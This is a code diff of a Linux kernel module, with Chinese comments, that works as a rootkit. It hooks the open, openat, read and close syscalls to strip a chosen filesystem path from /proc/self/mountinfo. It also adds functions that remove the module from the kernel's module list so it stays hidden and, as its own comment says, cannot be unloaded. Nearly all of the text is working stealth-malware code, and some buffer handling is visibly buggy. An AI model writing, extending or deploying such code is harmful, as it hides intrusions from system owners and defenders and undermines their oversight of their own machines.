@@ -14,17 +14,18 @@
 #include <asm/processor.h>
 #include <asm/segment.h>
 #include <asm/unistd.h>
-#include <linux/thread_info.h>
+#include <linux/version.h>
 
 
+//要隐藏的文件系统的根目录名(前后要各加上一个空格)
+#define HIDDEN_FS_FILE_PATH " /boot/efi "
 //proc文件系统中保存内核的文件系统信息的文件名
 #define MOUNTINFO_FILE_NAME "/proc/self/mountinfo"
-//要隐藏的文件系统的根目录名(前后要各加上一个空格)
-#define HIDDEN_FS_FILE_PATH " /sys/fs/bpf "
 #define FIRST_CHAR_OF_HIDDEN_FS_FILE_PATH ' '
 #define MOUNTINFO_MAX_LENGTH 131072
 
 MODULE_LICENSE("GPL");
+MODULE_VERSION("1.0");
 
 unsigned long *sys_call_table = 0;			/*系统调用表的指针*/
 
@@ -125,12 +126,19 @@ static void unhook_systemcall(unsigned int systemcall_num,hook_t orig_systemcall
 /*================end hook systemcall=========================*/
 
 //一些关于/proc/slef/mountinfo的打开文件的全局信息
-static int is_mountinfo_open=0;
-static unsigned int mountinfo_fd;
-static pid_t open_mountinfo_pid;
+struct processor_open_mountinfo
+{
+	int vaild;
+	pid_t pid;
+	unsigned int mountinfo_fd;
+	//int mountinfo_size;
+	unsigned int mountinfo_read_offset;
+	struct processor_open_mountinfo *next;
+};
+struct processor_open_mountinfo * process_open_mountiinfo_list;
 static char * mountinfo_content=NULL;
 static int mountinfo_size=0;
-static int mountinfo_read_offset=0;
+
 
 hook_t orig_openat;
 
@@ -141,18 +149,56 @@ asmlinkage long my_openat(const struct pt_regs * pt_registers)
 {
 	int ret=orig_openat(pt_registers),err;
 	char * openat_filename=kvzalloc(sizeof(MOUNTINFO_FILE_NAME),GFP_KERNEL);
+	struct processor_open_mountinfo *process_open_mountiinfo_current;
 	
 	err=copy_from_user(openat_filename,(char *)pt_registers->si,sizeof(MOUNTINFO_FILE_NAME));
 	
 	//检查要打开的文件是不是/proc/slef/mountinfo，如果是的话就记录下一些全局信息，准备给read系统调用使用
 	if(err == 0 && memcmp(openat_filename,MOUNTINFO_FILE_NAME,sizeof(MOUNTINFO_FILE_NAME))==0)
 	{
-		open_mountinfo_pid=task_pid_nr(current);
-		is_mountinfo_open=1;
-		mountinfo_fd=ret;
-		mountinfo_read_offset=0;
-		mountinfo_size=0;
-		mountinfo_content=NULL;
+		if((process_open_mountiinfo_current=kvzalloc(sizeof(struct processor_open_mountinfo),GFP_KERNEL))==NULL)
+		{
+			return ret;
+		}
+		process_open_mountiinfo_current->pid=task_pid_nr(current);
+		process_open_mountiinfo_current->mountinfo_fd=ret;
+		process_open_mountiinfo_current->mountinfo_read_offset=0;
+		
+		process_open_mountiinfo_current->next=process_open_mountiinfo_list->next;
+		process_open_mountiinfo_list->next=process_open_mountiinfo_current;
+	}
+	
+	kvfree(openat_filename);
+	
+	return ret;
+}
+
+hook_t orig_open;
+
+/*
+hook系统调用open
+*/
+asmlinkage long my_open(const struct pt_regs * pt_registers)
+{
+	int ret=orig_open(pt_registers),err;
+	char * openat_filename=kvzalloc(sizeof(MOUNTINFO_FILE_NAME),GFP_KERNEL);
+	struct processor_open_mountinfo *process_open_mountiinfo_current;
+	
+	err=copy_from_user(openat_filename,(char *)pt_registers->di,sizeof(MOUNTINFO_FILE_NAME));
+	
+	//检查要打开的文件是不是/proc/slef/mountinfo，如果是的话就记录下一些全局信息，准备给read系统调用使用
+	if(err == 0 && memcmp(openat_filename,MOUNTINFO_FILE_NAME,sizeof(MOUNTINFO_FILE_NAME))==0)
+	{
+		if((process_open_mountiinfo_current=kvzalloc(sizeof(struct processor_open_mountinfo),GFP_KERNEL))==NULL)
+		{
+			return ret;
+		}
+		process_open_mountiinfo_current->pid=task_pid_nr(current);
+		process_open_mountiinfo_current->mountinfo_fd=ret;
+		process_open_mountiinfo_current->mountinfo_read_offset=0;
+		
+		process_open_mountiinfo_current->next=process_open_mountiinfo_list->next;
+		process_open_mountiinfo_list->next=process_open_mountiinfo_current;
 	}
 	
 	kvfree(openat_filename);
@@ -168,13 +214,25 @@ hook系统调用read
 asmlinkage long my_read(const struct pt_regs * pt_registers)
 {
 	int ret=orig_read(pt_registers),err,line_start,line_end,tag;
-	unsigned int fd=pt_registers->di;
+	unsigned int fd=pt_registers->di,mountinfo_read_offset;
 	size_t count=pt_registers->dx;
+	struct processor_open_mountinfo * process_open_mountiinfo_current=process_open_mountiinfo_list->next;
+	pid_t current_pid=task_pid_nr(current);
+	
+	//从所有打开了/proc/self/mountinfo的进程中查找,如果有当前的进程的话,检测该进程打开文件句柄是不是/proc/self/mountinfo
+	while(process_open_mountiinfo_current)
+	{
+		if(current_pid==process_open_mountiinfo_current->pid && fd==process_open_mountiinfo_current->mountinfo_fd)
+		{
+			break;
+		}
+		process_open_mountiinfo_current=process_open_mountiinfo_current->next;
+	}
 	
 	//先检查要读取的文件是不是打开的/proc/slef/mountinfo
-	if(is_mountinfo_open==1 && task_pid_nr(current)==open_mountinfo_pid && fd==mountinfo_fd)
+	if(process_open_mountiinfo_current)
 	{
-		if(mountinfo_content==NULL)			//如果是第一次调读取/proc/slef/mountinfo的话，就不断地调用旧的read系统调用，将其所有的内容读出来，保存在内核中的一个字符串中
+		if(mountinfo_content==NULL)			//如果是第一次读取/proc/slef/mountinfo的话，就不断地调用旧的read系统调用，将其所有的内容读出来，保存在内核中的一个字符串中
 		{
 			mountinfo_size=0;
 			mountinfo_content=kvzalloc(MOUNTINFO_MAX_LENGTH,GFP_KERNEL);
@@ -238,30 +296,20 @@ asmlinkage long my_read(const struct pt_regs * pt_registers)
 		
 		
 		//之后每一次调用read读取/proc/slef/mountinfo的内容的时候都直接从内核中读取相应的字符串进行返回即可
-		if(mountinfo_size>=count)
+		mountinfo_read_offset=process_open_mountiinfo_current->mountinfo_read_offset;
+		if((mountinfo_size-mountinfo_read_offset)<count)
 		{
-			err=copy_to_user((char *)pt_registers->si,mountinfo_content+mountinfo_read_offset,count);
-			if(err!=0)
-			{
-				return 0;
-			}
-			mountinfo_read_offset+=count;
-			mountinfo_size-=count;
-			ret=count;
+			count=(mountinfo_size-mountinfo_read_offset);
 		}
-		else
+		err=copy_to_user((char *)pt_registers->si,mountinfo_content+mountinfo_read_offset,count);
+		if(err!=0)
 		{
-			err=copy_to_user((char *)pt_registers->si,mountinfo_content+mountinfo_read_offset,mountinfo_size);
-			if(err!=0)
-			{
-				return 0;
-			}
-			mountinfo_read_offset+=mountinfo_size;
-			ret=mountinfo_size;
-			mountinfo_size=0;
+			return 0;
 		}
-		
+		process_open_mountiinfo_current->mountinfo_read_offset+=count;
+		ret=count;
 	}
+	
 	return ret;
 }
 
@@ -273,37 +321,91 @@ hook系统调用close
 asmlinkage long my_close(const struct pt_regs * pt_registers)
 {
 	int ret=orig_close(pt_registers);
-	
 	unsigned int fd=pt_registers->di;
+	struct processor_open_mountinfo * process_open_mountiinfo_current=process_open_mountiinfo_list->next,*tmp=process_open_mountiinfo_list;
+	pid_t current_pid=task_pid_nr(current);
+	
+	//查看当前的进程是不是打开了/proc/self/mountinfo的话,如果是的话,再判断关闭的是不是/proc/self/mountinfo
+	while(process_open_mountiinfo_current)
+	{
+		if(current_pid==process_open_mountiinfo_current->pid && fd==process_open_mountiinfo_current->mountinfo_fd)
+		{
+			break;
+		}
+		process_open_mountiinfo_current=process_open_mountiinfo_current->next;
+		tmp=tmp->next;
+	}
+	
 	
 	//如果要关闭的文件是/proc/slef/mountinfo，就将对应的全局信息清空，然后释放内核中用于保存/proc/slef/mountinfo内容的字符串的空间即可
-	if(is_mountinfo_open==1 && task_pid_nr(current)==open_mountinfo_pid && fd==mountinfo_fd)
+	if(process_open_mountiinfo_current)
 	{
-		is_mountinfo_open=0;
-		kvfree(mountinfo_content);
-		mountinfo_content=NULL;
+		tmp->next=process_open_mountiinfo_current->next;
+		kvfree(process_open_mountiinfo_current);
 	}
 	
 	return ret;
+}
+
+static struct list_head *prev_module;
+static short hidden=0;
+
+/*
+显示隐藏的当前模块
+*/
+void showme(void)
+{
+	list_add(&THIS_MODULE->list,prev_module);
+	hidden=0;
+}
+
+/*
+隐藏当前模块
+*/
+void hideme(void)
+{
+	prev_module=THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	hidden=1;
 }
 
 
 /*模块的初始化函数，模块的入口函数，加载模块*/
 static int __init init_hidden_fs(void)
 {
-   	hook_systemcall_init();
-   	orig_openat=hook_systemcall(__NR_openat,my_openat);
-   	orig_close=hook_systemcall(__NR_close,my_close);
-   	orig_read=hook_systemcall(__NR_read,my_read);
+	process_open_mountiinfo_list=kvzalloc(sizeof(struct processor_open_mountinfo),GFP_KERNEL);
+	if(process_open_mountiinfo_list)
+	{
+		process_open_mountiinfo_list->next=NULL;
+		
+		hook_systemcall_init();
+   		orig_openat=hook_systemcall(__NR_openat,my_openat);
+   		orig_open=hook_systemcall(__NR_open,my_open);
+   		orig_close=hook_systemcall(__NR_close,my_close);
+   		orig_read=hook_systemcall(__NR_read,my_read);
+   		hideme();
+	}
 	return 0;
 }
 
-/*出口函数，卸载模块*/
+/*出口函数，卸载模块(卸载不了,因为隐藏了)*/
 static void __exit exit_hidden_fs(void)
 {
-   	unhook_systemcall(__NR_openat,orig_openat);
-   	unhook_systemcall(__NR_close,orig_close);
-   	unhook_systemcall(__NR_read,orig_read);
+	if(process_open_mountiinfo_list)
+	{
+		kvfree(process_open_mountiinfo_list);
+		
+		if(mountinfo_content)
+		{
+			kvfree(mountinfo_content);
+		}
+		
+		unhook_systemcall(__NR_openat,orig_openat);
+		unhook_systemcall(__NR_open,orig_open);
+   		unhook_systemcall(__NR_close,orig_close);
+   		unhook_systemcall(__NR_read,orig_read);
+   		showme();
+	}
 }
 
 module_init(init_hidden_fs);
